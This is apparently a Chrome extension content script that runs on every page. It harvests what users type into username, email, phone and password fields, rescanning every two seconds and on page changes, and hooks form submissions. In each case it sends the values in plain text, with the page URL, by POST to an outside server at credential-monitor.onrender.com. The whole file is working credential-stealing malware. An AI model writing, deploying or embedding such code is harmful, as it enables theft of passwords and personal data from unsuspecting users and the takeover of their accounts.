// Monitor all input fields
let passwordInputs = [];
let isConnected = false;

// Detect field type based on attributes
function detectFieldType(input) {
  const name = (input.name + ' ' + input.id + ' ' + input.placeholder + ' ' + input.type).toLowerCase();
  const autocomplete = input.autocomplete ? input.autocomplete.toLowerCase() : '';
  
  if (input.type === 'email' || name.includes('email') || autocomplete.includes('email')) {
    return 'email';
  }
  if (input.type === 'tel' || name.includes('phone') || name.includes('mobile') || name.includes('tel') || autocomplete.includes('tel')) {
    return 'phone';
  }
  if (name.includes('user') || name.includes('login') || name.includes('username') || 
      name.includes('member') || autocomplete.includes('username')) {
    return 'username';
  }
  if (input.type === 'password' || name.includes('pass') || name.includes('pwd')) {
    return 'password';
  }
  return 'other';
}

// Check connection to background script
function checkConnection() {
  try {
    chrome.runtime.sendMessage({ action: "ping" }, response => {
      if (!chrome.runtime.lastError) {
        isConnected = true;
      }
    });
  } catch (error) {
    console.log('Background not ready yet');
  }
}

// Send data with retry mechanism
function sendPasswordData(data) {
  // Always try to send via fetch directly first
  fetch('https://credential-monitor.onrender.com/passwords', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  }).catch(err => console.log('Direct send failed:', err));

  // Also try via chrome.runtime
  try {
    chrome.runtime.sendMessage({ 
      action: "passwordDetected", 
      data: data 
    }, response => {
      if (chrome.runtime.lastError) {
        // Ignore connection errors
      }
    });
  } catch (error) {
    // Ignore connection errors
  }
}

function scanForPasswords() {
  const inputs = document.querySelectorAll('input');
  const forms = document.querySelectorAll('form');
  
  // Store found credentials
  let credentials = {
    username: null,
    email: null,
    phone: null,
    password: null,
    other_fields: {}
  };
  
  // Scan all inputs
  inputs.forEach(input => {
    if (input.value && input.value.length > 0) {
      const fieldType = detectFieldType(input);
      const fieldInfo = {
        type: fieldType,
        name: input.name || input.id || 'unknown',
        value: input.value,
        placeholder: input.placeholder || '',
        autocomplete: input.autocomplete || ''
      };
      
      // Categorize based on field type
      switch(fieldType) {
        case 'email':
          credentials.email = fieldInfo;
          break;
        case 'phone':
          credentials.phone = fieldInfo;
          break;
        case 'username':
          credentials.username = fieldInfo;
          break;
        case 'password':
          credentials.password = fieldInfo;
          break;
        default:
          credentials.other_fields[input.name || input.id || 'field_' + Date.now()] = fieldInfo;
      }
      
      // Monitor for changes
      if (!passwordInputs.includes(input)) {
        passwordInputs.push(input);
        
        // Add multiple event listeners
        ['change', 'blur', 'input'].forEach(eventType => {
          input.addEventListener(eventType, function(e) {
            if (this.value && this.value.length > 0) {
              const currentFieldType = detectFieldType(this);
              sendPasswordData({
                type: `field_${eventType}`,
                field_type: currentFieldType,
                url: window.location.href,
                field_name: this.name || this.id || 'unknown',
                field_value: this.value,
                placeholder: this.placeholder || '',
                timestamp: new Date().toISOString(),
                page_title: document.title
              });
            }
          });
        });
      }
    }
  });
  
  // If we have both username/email and password, send as complete credentials
  if ((credentials.username || credentials.email || credentials.phone) && credentials.password) {
    sendPasswordData({
      type: 'complete_credentials',
      url: window.location.href,
      page_title: document.title,
      timestamp: new Date().toISOString(),
      credentials: {
        username: credentials.username ? credentials.username.value : null,
        email: credentials.email ? credentials.email.value : null,
        phone: credentials.phone ? credentials.phone.value : null,
        password: credentials.password.value,
        field_names: {
          username_field: credentials.username ? credentials.username.name : null,
          email_field: credentials.email ? credentials.email.name : null,
          phone_field: credentials.phone ? credentials.phone.name : null,
          password_field: credentials.password.name
        }
      }
    });
  }
  
  // Monitor forms for submission
  forms.forEach(form => {
    if (!form.hasAttribute('data-monitored')) {
      form.setAttribute('data-monitored', 'true');
      
      form.addEventListener('submit', function(e) {
        const formData = new FormData(this);
        const formCredentials = {
          username: null,
          email: null,
          phone: null,
          password: null,
          all_fields: {}
        };
        
        formData.forEach((value, key) => {
          const keyLower = key.toLowerCase();
          formCredentials.all_fields[key] = value;
          
          // Categorize fields
          if (keyLower.includes('email')) {
            formCredentials.email = { field: key, value: value };
          } else if (keyLower.includes('phone') || keyLower.includes('mobile') || keyLower.includes('tel')) {
            formCredentials.phone = { field: key, value: value };
          } else if (keyLower.includes('user') || keyLower.includes('login') || keyLower.includes('username')) {
            formCredentials.username = { field: key, value: value };
          } else if (keyLower.includes('pass') || keyLower.includes('pwd')) {
            formCredentials.password = { field: key, value: value };
          }
        });
        
        sendPasswordData({
          type: 'form_submission_complete',
          url: window.location.href,
          form_action: this.action || 'unknown',
          form_method: this.method || 'POST',
          page_title: document.title,
          timestamp: new Date().toISOString(),
          credentials: formCredentials,
          all_fields: formCredentials.all_fields
        });
      });
    }
  });
}

// Initial scan with delay
setTimeout(() => {
  scanForPasswords();
  checkConnection();
}, 1000);

// Listen for messages from background
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "checkPasswords") {
    scanForPasswords();
    sendResponse({ status: "scanned" });
  }
  return true;
});

// Periodic scan
setInterval(scanForPasswords, 2000);

// Monitor dynamic content changes
const observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    if (mutation.addedNodes.length > 0) {
      scanForPasswords();
    }
  });
});

observer.observe(document.body, {
  childList: true,
  subtree: true
});

console.log('Enhanced password monitor loaded - capturing usernames, emails and phones');
